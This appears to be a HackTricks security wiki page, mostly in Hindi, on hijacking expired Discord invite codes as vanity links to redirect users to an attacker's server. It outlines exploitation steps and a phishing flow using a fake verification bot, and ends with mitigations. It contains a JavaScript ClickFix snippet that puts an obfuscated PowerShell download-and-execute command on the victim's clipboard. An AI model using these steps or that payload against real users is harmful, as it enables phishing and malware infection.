# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord की invite system vulnerability threat actors को expired या deleted invite codes (temporary, permanent, या custom vanity) को किसी भी Level 3 boosted server पर नए vanity links के रूप में claim करने की अनुमति देती है। सभी codes को lowercase में normalize करके, attackers ज्ञात invite codes को पहले से pre-register कर सकते हैं और original link के expire होने या source server के अपना boost खोने के बाद traffic को चुपचाप hijack कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Expiration के बाद code उपलब्ध हो जाता है और boosted server द्वारा vanity URL के रूप में फिर से register किया जा सकता है। |
| Permanent Invite Link | ⚠️          | यदि इसे delete कर दिया जाए और इसमें केवल lowercase letters और digits हों, तो code फिर से उपलब्ध हो सकता है।        |
| Custom Vanity Link    | ✅          | यदि original server अपना Level 3 Boost खो देता है, तो उसका vanity invite नए registration के लिए उपलब्ध हो जाता है।    |

## Exploitation Steps

1. Reconnaissance
- Public sources (forums, social media, Telegram channels) में `discord.gg/{code}` या `discord.com/invite/{code}` pattern से match करने वाले invite links को monitor करें।<sup>[[1]](#references)</sup>
- रुचि वाले invite codes (temporary या vanity) collect करें।
2. Pre-registration
- Level 3 Boost privileges वाले Discord server को create करें या किसी existing server का उपयोग करें।
- **Server Settings → Vanity URL** में target invite code assign करने का प्रयास करें। यदि स्वीकार हो जाता है, तो code malicious server द्वारा reserve कर लिया जाता है।
3. Hijack Activation
- Temporary invites के लिए original invite के expire होने तक wait करें (या यदि source पर आपका control है, तो उसे manually delete करें)।
- Uppercase वाले codes के लिए lowercase variant को तुरंत claim किया जा सकता है, हालांकि redirection केवल expiration के बाद activate होता है।
4. Silent Redirection
- Hijack active होने के बाद पुराने link पर जाने वाले users को seamlessly attacker-controlled server पर भेज दिया जाता है।

## Phishing Flow via Discord Server

1. Server channels को restrict करें ताकि केवल **#verify** channel दिखाई दे।<sup>[[1]](#references)</sup>
2. Newcomers को OAuth2 के माध्यम से verify करने के लिए prompt करने वाला bot (जैसे, **Safeguard#0786**) deploy करें।
3. Bot users को CAPTCHA या verification step के बहाने phishing site (जैसे, `captchaguard.me`) पर redirect करता है।
4. **ClickFix** UX trick implement करें:
- एक broken CAPTCHA message display करें।
- Users को **Win+R** dialog खोलने, पहले से loaded PowerShell command paste करने और Enter दबाने का निर्देश दें।

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
यह approach direct file downloads से बचता है और user suspicion को कम करने के लिए परिचित UI elements का लाभ उठाता है।<sup>[[1]](#references)</sup>

## Mitigations

- ऐसे permanent invite links का उपयोग करें जिनमें कम से कम एक uppercase letter या non-alphanumeric character हो (कभी expire न हों, दोबारा उपयोग न किए जा सकें)।<sup>[[1]](#references)</sup>
- Invite codes को नियमित रूप से rotate करें और पुराने links को revoke करें।
- Discord server boost status और vanity URL claims को monitor करें।
- Users को server authenticity verify करने और clipboard-pasted commands को execute करने से बचने के लिए educate करें।

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
